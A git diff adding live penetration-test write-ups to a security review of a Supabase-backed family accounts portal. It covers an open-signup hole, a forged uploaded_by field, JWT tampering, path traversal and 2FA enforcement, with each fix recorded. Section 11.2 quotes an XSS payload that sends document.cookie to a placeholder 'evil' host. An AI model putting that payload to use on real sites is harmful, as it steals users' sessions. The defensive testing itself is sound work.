@@ -280,3 +280,497 @@ assumed correct:
 
 `sw.js`'s cache version was bumped so every visitor picks up these changes
 on next load rather than serving a stale cached copy.
+
+## 6. Live penetration test (14 Sep 2026, against the real deployed site)
+
+Everything above was tested against mocks or the site's own code. This
+round tested the actual live GitHub Pages site and Supabase project,
+adversarially — no accounts, no cooperation from the app's own JavaScript,
+just the same public URLs and API endpoints anyone else can reach.
+
+### 6.1 Found and fixed: anyone could self-register an account
+
+The site has no signup form, but "Allow new users to sign up" was still
+switched on in Supabase Auth — meaning anyone who found the project's URL
+and anon key (both are meant to be public, by design) could call the
+Auth API directly and create a fully confirmed account in one request,
+without ever touching the site's UI. Confirmed live: a throwaway test
+account was created this way, used to log in, cleaned up immediately
+after.
+
+That account could then read the full `entities` table — all 36 rows:
+the Ltd company, both Chaucer Street properties, 33 North Denes, 3
+Horning Close, Wild Thyme, and Oscar/Sally/Iris's names against each of
+their sole trader, bank statement, investment and payslip sections. Not
+documents or figures — `entities` is just labels, deliberately readable
+by "anyone signed in" so the account-creation flow can show names — but
+still the shape of the whole company and family finances, to anyone who
+could get an account.
+
+**Fixed**: "Allow new users to sign up" is now off. Every account still
+has to be created by Oscar from the Supabase dashboard, same as always —
+this just closes the back door that let someone skip that step entirely.
+Re-tested live: the signup endpoint now returns `signup_disabled`.
+
+### 6.2 Everything else held
+
+- **No data readable without logging in.** Direct REST API calls to
+  `entities`, `portal_access`, and `entity_documents` with just the
+  public anon key (no session) all correctly returned "permission
+  denied" — confirmed live, not assumed from the policy text.
+- **No data readable through someone else's account.** The throwaway
+  test account above — signed in, but with zero `portal_access` rows —
+  got an empty result from `portal_access`, `entity_documents`, and
+  Storage, no matter what it asked for. Row-level security is doing the
+  actual filtering, not the app's JavaScript, so nothing an attacker
+  types into the browser console can get around it.
+- **Storage bucket doesn't leak by direct access either.** Tried listing
+  and fetching files in `owner-documents` with no session and with the
+  throwaway account — both denied/empty. Bucket enumeration
+  (`/storage/v1/bucket`) returns nothing to a signed-out caller.
+- **No secrets ever committed.** Checked the full git history (all 3
+  commits), not just the current files — only the intentionally-public
+  anon/publishable key appears anywhere. No database password, no
+  `service_role`/secret key, no `.env` file.
+- **Pages don't leak data before the login check runs.** Loading
+  `dashboard.html`, `property.html`, etc. directly with no session
+  redirects to the login page — and this is belt-and-braces only, since
+  the real protection (RLS, above) doesn't depend on that redirect
+  happening at all.
+- **The 2FA-enforcement policies are wired correctly.** Confirmed by
+  inspecting the live database's actual policy definitions (not just the
+  schema file) — all four restrictive `mfa_ok()` policies are present on
+  the right tables (`entities`, `portal_access`, `entity_documents`,
+  `storage.objects`) with the right condition. Not re-tested end-to-end
+  live, since no account has turned 2FA on yet to exercise the "blocked"
+  path against a real session — the earlier mock-based test in section 5
+  covers that behaviour.
+- **Clickjacking mitigation is present on every page** on the live site,
+  matching what section 1.6 added.
+
+### 6.3 Accepted, not a bug
+
+Any signed-in account — even one with no sections granted yet — can
+still read the `entities` table's names. This is intentional (see 6.1)
+and was already documented; closing the open-signup hole means the only
+way to get an account at all is Oscar creating one, which limits this to
+people he's already decided should have some access.
+
+## 7. Second live penetration test (14 Sep 2026, same day — more aggressive)
+
+Round two, at Oscar's request to push harder. First re-confirmed every
+fix from section 6 was still live (it was), then went after the write
+path and the account system itself, using a throwaway test account
+created and deleted via the Supabase dashboard for the purpose (never a
+real account, cleaned up completely afterwards, including every row it
+touched).
+
+### 7.1 Found and fixed: `uploaded_by` could be forged
+
+The test account was given real, narrow access — upload rights to
+exactly one section, nothing else, the same shape any real account has.
+With that access, it could insert a genuine, allowed document — but the
+`uploaded_by` field on that row had no check tying it to who was
+actually signed in. It could set `uploaded_by` to Oscar's real account
+ID, and the database accepted it. Confirmed live: a row now existed
+saying Oscar uploaded a document he'd never seen, from an account that
+wasn't his.
+
+This doesn't expose anything — the attacker still needs real upload
+access to some section first, same as before — but it breaks the "who
+actually uploaded this" record for the sections it does touch, which
+matters for anything you'd treat as an audit trail (who submitted an
+expense, whose name is on a document if it's ever disputed).
+
+**Fixed**: the insert rule for documents now also requires
+`uploaded_by` to either be left blank or match the real signed-in
+account — never anyone else's. Re-tested live: the same forgery attempt
+now gets rejected, while a normal upload (setting `uploaded_by` to your
+own ID, or not setting it at all — both are how the site's own code
+does it) still works exactly as before.
+
+### 7.2 Everything else held, including under direct attack
+
+- **Cross-section writes, not just reads.** With access to only one
+  section, the test account tried inserting documents into others it
+  had no grant for — rejected every time, `row-level security policy`
+  violation, exactly as the read-side test in section 6 already showed
+  for reads.
+- **Storage path tricks didn't work.** Tried uploading into another
+  section's folder directly, and via a `../` path-traversal payload
+  aimed at escaping the one folder it did have access to — both
+  rejected. Only the legitimate folder accepted the upload.
+- **JWT tampering was rejected outright.** Took the test account's own
+  login token, edited it directly — swapped in Oscar's account ID,
+  marked itself as fully verified 2FA, even tried claiming
+  `service_role` (Supabase's own full-access key type) — and sent it
+  back without a valid signature, since forging one isn't possible
+  without the project's private signing key. Rejected immediately,
+  wrong signature. This is the strongest form of "pretend to be someone
+  else" attack there is against this kind of system, and it doesn't
+  work.
+- **No SQL/filter injection.** Tried classic injection-style payloads
+  in the API's filter parameters — the query layer treats them as
+  literal text to match, never as code, so nothing came back except
+  correctly-empty results.
+- **No account enumeration.** A wrong password on Oscar's real email
+  and a wrong password on an email that's never existed produce the
+  identical error. The password-reset endpoint responds identically
+  either way too — nothing lets an outsider figure out who has an
+  account here.
+- **Login attempts are rate-limited.** Ten rapid wrong-password
+  attempts all went through without being blocked — expected, Supabase
+  allows up to 360 sign-in attempts per IP every 5 minutes by default,
+  which is the standard, reasonable setting; brute-forcing a real
+  password past that limit isn't practical, and 2FA is the stronger
+  answer for this anyway (see section 1.5/13).
+- **No secrets anywhere.** Re-swept every deployed file and the full
+  git history again for anything that shouldn't be public — clean.
+  There's no custom deployment workflow in this repo either (GitHub
+  Pages deploys itself automatically), so there's no build log that
+  could ever leak something by accident.
+
+All test data — the throwaway account, its one access grant, the
+documents it created (including the forged one, before the fix) — was
+deleted immediately after each test. Nothing pentest-related remains
+anywhere in the live project.
+
+## 8. Security hardening, self-service password reset, and a benchmark against Xero/QuickBooks (15 Sep 2026)
+
+Following on from the pentest rounds above, turned on every remaining
+free security setting on both the Supabase side and the GitHub side,
+added a proper self-service password reset flow (there wasn't one
+before — this was a real gap), and checked how the site's security
+compares to Xero and QuickBooks Online, since those are the standard
+your accountant and Sally will implicitly be comparing it to.
+
+**Supabase settings turned on:**
+- Minimum password length raised from 6 to 10 characters, with a new
+  requirement for a mix of uppercase, lowercase, a number, and a
+  symbol (previously no character-type requirement at all).
+- "Require current password when updating" — previously a hijacked
+  session, or someone at an unlocked laptop, could change the account
+  password without knowing the existing one. Now the account's
+  current password is required to change it.
+- "Prevent use of leaked passwords" (HaveIBeenPwned check) is *not*
+  on — it's a Supabase Pro-plan feature, not available on the current
+  plan.
+
+**GitHub settings turned on:** private vulnerability reporting,
+dependency graph, Dependabot alerts (including malware alerts and
+security updates), secret scanning, and secret scanning push
+protection (blocks a commit containing a real secret before it's even
+pushed). Left off: Dependabot version updates and CodeQL code
+scanning — both need a dependency manifest or compiled code to do
+anything, and this is a plain static site with neither.
+
+**Self-service password reset**, since there wasn't one before (the
+only way to change a password used to be asking whoever holds the
+Supabase Admin Users screen):
+- A "Forgot your password?" link on the login page, which emails a
+  reset link via Supabase's own resetPasswordForEmail — shows the
+  same message whether or not the address has an account, so it can't
+  be used to check who has a login here, same as the login and
+  recovery endpoints already tested in section 7.
+- A new `reset-password.html` page that the emailed link lands on,
+  which waits for Supabase to confirm the link is genuine before
+  showing a "set a new password" form, and shows a plain "this link is
+  invalid or has expired" message otherwise rather than a raw error.
+- A "Change password" form on the Account & Security page for anyone
+  already signed in, which requires the current password (see above).
+- Updated the Supabase project's Site URL (was still the default
+  `localhost:3000`) and added the live site to the redirect URL
+  allow-list, since without that the reset link would have silently
+  failed to come back to the right page.
+- Tested live end-to-end: requested a reset for Sally's real address,
+  got the same "if this has an account" message either way, and
+  confirmed `reset-password.html` correctly rejects a direct visit
+  with no valid token rather than erroring or exposing anything.
+
+**Benchmark against Xero and QuickBooks Online:** the one real gap is
+two-factor authentication. Both Xero and QuickBooks Online *mandate*
+MFA for every user — it isn't optional, and on Xero in particular you
+cannot keep using the product at all without setting it up. This
+portal has the same TOTP-based 2FA available (see section 13 /
+security.html) but it's opt-in — each of Oscar, Sally, and the
+accountant has to turn it on themselves, and nothing currently forces
+that. Password rules are already at or above the bar either service
+sets (QuickBooks requires 8+ characters with letters, numbers, and
+symbols; this site now requires 10+ with the same mix). Neither
+service publishes a specific failed-login lockout policy beyond rate
+limiting, which this site already has via Supabase's defaults (see
+section 7.2).
+
+**Recommended next step, not yet done:** decide whether to make 2FA
+mandatory rather than optional — the groundwork (TOTP enrollment,
+server-side enforcement once a factor is verified) is already built
+and working, so making it compulsory would mean gating first login
+behind setup rather than any new database or auth work. Worth doing
+if the portal will hold anything an accountant or insurer would
+expect to be behind MFA as standard, which is increasingly the norm
+for this category of software.
+
+## 9. Two-factor authentication made compulsory (15 Sep 2026)
+
+Following on directly from the "recommended next step" at the end of
+section 7 above: 2FA is no longer optional. Every account is now required
+to have an authenticator app set up, and the prompt to do so appears
+immediately, inline, on the login page itself — never a separate trip to
+the account-management page.
+
+**What changed:**
+
+- **A never-enrolled account** gets walked straight into setup (QR code,
+  setup key, confirm code) right after the password step succeeds, on
+  `index.html` itself. There is no way to reach the dashboard without
+  finishing this.
+- **An already-enrolled account** still gets the same inline code-entry
+  step as before, immediately after the password step — nothing changed
+  there.
+- **The database itself now requires it, full stop.** `mfa_ok()` in
+  `supabase-schema.sql` no longer has an exemption for an account with no
+  verified factor — previously it did, which is what made 2FA opt-in in
+  practice even though the enforcement policies existed. Now every read
+  and write to `entities`, `portal_access`, `entity_documents`, and
+  Storage requires a session that has actually completed a 2FA challenge
+  this login, regardless of whether the account has ever set one up.
+- **Closed a gap this also revealed:** `dashboard.html`, `property.html`,
+  and `person.html` previously only checked that *a session existed*, not
+  that it had cleared 2FA — so an old, already-authenticated-at-aal1
+  browser tab could reach those pages directly, skipping the login page's
+  own MFA/enrollment gate entirely (the database would have refused the
+  actual data either way, but the page itself gave no way back into
+  setting up 2FA). All three now check the session's assurance level on
+  load and send anything short of a completed 2FA challenge back to
+  `index.html`, which handles both the "never enrolled" and "enrolled but
+  not yet challenged this login" cases.
+
+**Live-tested end to end** against Sally's account: logged in with no
+factor enrolled → forced straight into the QR/setup-key/confirm-code flow
+on the login page → completed it → landed on the dashboard with her usual
+access intact. Then logged in again (factor now enrolled, fresh session at
+aal1) → got the existing inline code step, not the enrollment flow →
+tried navigating straight to `dashboard.html` before entering a code → got
+sent back to `index.html` automatically → entered the code → reached the
+dashboard normally. Also confirmed `person.html` behaves the same way for
+an already-cleared session, and that the tightened database rule doesn't
+block a session that has genuinely completed 2FA (Sally's dashboard loaded
+her full set of properties and people as normal, not an error).
+
+**One thing to know:** because this is enforced at the database level
+immediately, Oscar's own account (and any other account that hasn't set up
+2FA yet) will be walked into the same setup flow the very next time it
+logs in — there's nothing else to do to make that happen, but it's worth
+knowing the first login after this change will look different than usual.
+
+## 10. Final stress test (15 Sep 2026) — a real bug found and fixed
+
+Requested as a last, intense adversarial pass before treating the site as
+finalised. Covered, against the live site and database:
+
+- **Unauthenticated access**: confirmed anonymous requests to `entities`,
+  `portal_access`, `entity_documents`, and Storage all come back empty —
+  RLS blocks everything without a valid session.
+- **Signup abuse**: public signup is disabled at the Supabase project
+  level (`"Signups not allowed for this instance"`), so no route to create
+  an account exists outside Oscar adding one by hand.
+- **aal1-vs-aal2 boundary**: a session stuck at password-only, for an
+  account with 2FA enrolled, was tested directly against the database
+  (not just through the UI) and confirmed blocked on every table and on
+  Storage — matches section 9's tightened `mfa_ok()`.
+- **Cross-entity access**: tried reading and writing another entity's
+  documents from a session that shouldn't have access to it. First attempt
+  looked like it might have slipped through — turned out to be a false
+  alarm caused by testing against an entity (Iris's) where Sally
+  legitimately does have upload access alongside Oscar. Re-tested against
+  an entity with zero `portal_access` rows for that session and got a
+  clean, hard block, confirming RLS is sound.
+- **Storage path/RLS boundaries**: confirmed the entity-id folder
+  convention Storage relies on for scoping isn't exploitable — Storage
+  treats `/` as a literal character in object names with no `..`
+  traversal, and the RLS policies on `storage.objects` were read directly
+  from `pg_policies` and match what's intended.
+- **2FA unenroll-as-bypass**: confirmed Supabase itself refuses to
+  unenroll a verified factor unless the session is already at aal2 — so a
+  stolen aal1 session can't turn 2FA off to get around it.
+
+**What this found**: the abandoned-enrollment fix from section 9 didn't
+actually work. Live end-to-end testing (not just manual console checks)
+kept reproducing the original "Could not start setup just now" failure
+even from what looked like a clean state. Root cause turned out to be a
+Supabase JS SDK quirk: `listFactors()`'s response has two shapes for the
+same data — an authoritative `.data.all` array with every factor
+regardless of status, and separate type-grouped arrays like `.data.totp`
+— and `.data.totp` was proven, by comparing both side by side on a real
+stuck test account, to sometimes come back empty even when `.data.all`
+correctly lists the same unverified factor at the same moment. Every
+place in the code that used `.data.totp` to decide "does an
+unverified/verified factor exist" inherited this unreliability —
+including a second, older instance of the same pattern in `security.js`'s
+own account-settings 2FA toggle, which had been silently broken since
+before this session's work even started.
+
+**Fixed**: every one of these lookups (`auth.js`'s enrollment-cleanup,
+cancel-link cleanup, post-login verified-factor check, and code-submit
+handler; `security.js`'s status-loading cleanup) now derives
+unverified/verified factors from `.data.all` filtered by
+`factor_type === 'totp'`, never from the pre-grouped `.data.totp` array.
+
+**Re-verified live**, through the real page-load flow rather than manual
+replication (the thing that gave false confidence last time): reset to a
+genuinely stuck test account (one real leftover unverified factor from
+earlier testing), logged in three times in a row, abandoning setup after
+each QR code without confirming — every attempt correctly cleaned up the
+previous unverified factor and issued a fresh one, confirmed directly in
+the database (exactly one `unverified` row at a time, never a pile-up).
+On the fourth attempt, completed the flow for real with a generated
+authenticator code and reached the dashboard normally, confirming the
+happy path still works too. The disposable test account used for this was
+deleted afterwards.
+
+**Net result**: no exploitable vulnerability was found in the boundaries
+tested above; the one real bug this stress test surfaced (the
+`.data.totp` unreliability) is now fixed and confirmed live, and was
+actually more significant than first realised — it affected both the new
+compulsory-enrollment flow and the pre-existing account-settings 2FA
+toggle.
+
+## 11. Aggressive adversarial sweep (19 Sep 2026) — this repo, this document included
+
+Requested explicitly as a "sweeping, comprehensive and aggressive" pass,
+from a hacker's perspective, after the dashboard/monthly-chart work. Two
+real findings, both fixed; everything else re-confirmed live and still
+holding.
+
+### 11.1 Found and fixed: this document, SETUP.md, and the database schema
+were public
+
+The single biggest finding of this round. The GitHub repo behind this site
+has always been **public** (confirmed via the GitHub API — `private:
+false`), a deliberate tradeoff documented in `SETUP.md` so that free
+GitHub Pages could serve it without a paid plan. That's a reasonable
+tradeoff for the site's own code — there's nothing secret in the
+JavaScript — but GitHub Pages was configured to publish from the repo
+root, which meant it was also serving every non-code file sitting there:
+this document (`SECURITY_AND_UX_REVIEW.md`, every past pentest write-up,
+in full, including exact exploit techniques already fixed), `SETUP.md`
+(full walkthrough of the database structure, table names, and how the
+project is wired together), and `supabase-schema.sql` (the literal table
+definitions, column names, and every RLS policy, verbatim). Confirmed
+live: all three were fetchable at their plain URLs
+(`.../houseago-accounts-portal/SECURITY_AND_UX_REVIEW.md` etc.), no login
+needed.
+
+None of this granted access on its own — Postgres enforces row-level
+security independently of whether an attacker has read the policy text,
+and section 6 already confirmed anonymous requests get refused regardless.
+But it was free, high-quality reconnaissance for no reason: the exact
+names of every security control (`mfa_ok()`, the entity-id folder
+convention, etc.), every attack already tried against this site
+(including ones that worked before being fixed), and — beyond the
+technical side — the Houseago family's and every property's names, laid
+out for anyone who found the URL.
+
+**Fixed**: restructured the repo so GitHub Pages only serves what the site
+actually needs. Every published file (`index.html` and friends, `assets/`,
+`manifest.webmanifest`, `robots.txt`, `sw.js`) moved into a new `docs/`
+folder using `git mv` (keeps each file's history); this document,
+`SETUP.md`, `supabase-schema.sql`, and the `supabase/` Edge Function
+source (checked again in this pass — still clean, no secrets, pulls
+`SUPABASE_SERVICE_ROLE_KEY` from its environment same as always) stay at
+the repo root. GitHub Pages' publishing source was then switched from
+"main / (root)" to "main / docs" in the repo's own Settings → Pages —
+confirmed live: this document, `SETUP.md`, and the schema file all now
+404, while every real page (checked `index.html` and `receipts.html`,
+including its five CDN scripts) still loads cleanly with no console
+errors. Nothing in the site's own HTML/JS needed rewriting for this — all
+of its internal links were already relative, so `docs/` becoming the new
+publish root didn't break anything.
+
+**Not fully closed, your call if you want to go further**: the repo
+itself is still public, so its full commit history and current source are
+still visible to anyone on GitHub who looks (not just via the published
+site). That's unavoidable on a free plan without either paying for GitHub
+Pages from a private repo or moving to different hosting — and, as
+before, there's genuinely no secret in the code itself (the anon/
+publishable Supabase key is meant to be public; the one real secret,
+`SUPABASE_SERVICE_ROLE_KEY`, only ever lives in the Edge Function's own
+environment, never in the repo). Worth knowing, not urgent.
+
+### 11.2 Found and fixed: attribute-context XSS in a few places, worst one
+via a forged "bank statement"
+
+A second, genuine bug class, the same one fixed once before for the 2FA
+QR code (section 1.3) — `escapeHtml()` only escapes `&`/`<`/`>`, which is
+safe for ordinary text but not for a value placed inside a double-quoted
+HTML attribute (`value="..."`, `aria-label="..."`), where a `"` character
+can break out and inject markup. That first fix wasn't applied everywhere
+the same mistake existed.
+
+**Worst instance**: `property.js`'s and `person.js`'s bank-statement-scan
+feature (added earlier this project, reads a bank statement file via OCR
+and suggests likely rent lines) rendered the OCR-extracted description and
+date straight into `value="..."` attributes using `escapeHtml`, not an
+attribute-safe escape. A bank statement is, by definition, a file someone
+else can hand you — so a deliberately crafted "statement" (an image or
+PDF) containing a line like `rent " autofocus onfocus="fetch('https://
+evil/x?c='+document.cookie)` would, when the uploader picked that file,
+break out of the attribute and execute in the uploader's own signed-in
+session the instant the candidate rows render — no click needed. That's a
+real path from "malicious file" to "your session, in your own browser."
+
+**Also found**, lower severity — the same `escapeHtml`-in-an-attribute
+mistake in several `<option value="...">` sites built from document years
+or entity ids across `auth.js`, `property.js`, `person.js`, and
+`receipts.js`. These need existing upload access to exploit (not a fully
+outside attacker), so lower risk, but the same bug class.
+
+**Fixed**: added a proper `escapeAttr()` (escapes quotes too, not just
+`&`/`<`/`>`) to every file that was missing one (`property.js`,
+`person.js`, `receipts.js`, `asset-overview.js` — `auth.js`,
+`doc-scan.js`, and `security.js` already had one), and switched every
+attribute-context site to use it. Every text-content site already using
+`escapeHtml` was checked and confirmed correct — left alone.
+
+### 11.3 Also done: pinned and hash-verified every third-party script
+
+Not a live exploit, but a real supply-chain gap: every CDN-loaded library
+(Supabase JS, pdf.js, Tesseract.js, jsPDF, SheetJS, JSZip) loaded with no
+Subresource Integrity check, and `@supabase/supabase-js` was pinned only
+to its floating major version (`@2`), so any 2.x release — including one
+that never should have shipped, or a compromised one — would have loaded
+automatically with zero review. Every script tag across every page now
+carries a SHA-384 integrity hash and `crossorigin="anonymous"`, and
+`supabase-js` is pinned to the exact version already in use (2.116.0).
+Confirmed live: every page still loads with a clean console, meaning
+every hash matches what's actually being served.
+
+### 11.4 Re-confirmed live, still holding
+
+Re-ran the core adversarial checks from sections 6, 7, and 10 against the
+live site and database before declaring anything fixed:
+
+- Unauthenticated REST calls to `entities`, `portal_access`, and
+  `entity_documents` with only the public key: all still `401 permission
+  denied`, not just an empty result — the anon role has no grant at all.
+- Storage bucket listing (`/storage/v1/bucket`) with no session: still an
+  empty array, no enumeration.
+- Public signup: still `signup_disabled`.
+- Storage object listing/fetching and a `../`-style path-traversal payload
+  against the storage REST API directly: all still rejected
+  (`permission denied for table portal_access` — the RLS-backed policy,
+  not a filename check, is what's actually stopping this).
+- Login and password-recovery responses for a real address vs. a
+  nonexistent one: still identical, no account-enumeration signal. (One
+  side-effect of this specific check: it fired a genuine password-reset
+  email to Oscar's own real address, since testing this property means
+  actually calling the recovery endpoint — flagged to him at the time,
+  harmless, no email sent to anyone else.)
+
+### 11.5 Everything fixed in this round is live
+
+Both code fixes (11.2, 11.3) and the repo restructure (11.1) are pushed to
+`main` and confirmed live — `sw.js` bumped to v31 for the code fixes, and
+the Pages source change (11.1) took effect within about a minute of being
+saved, verified by re-fetching the previously-public files and the live
+site itself afterwards.
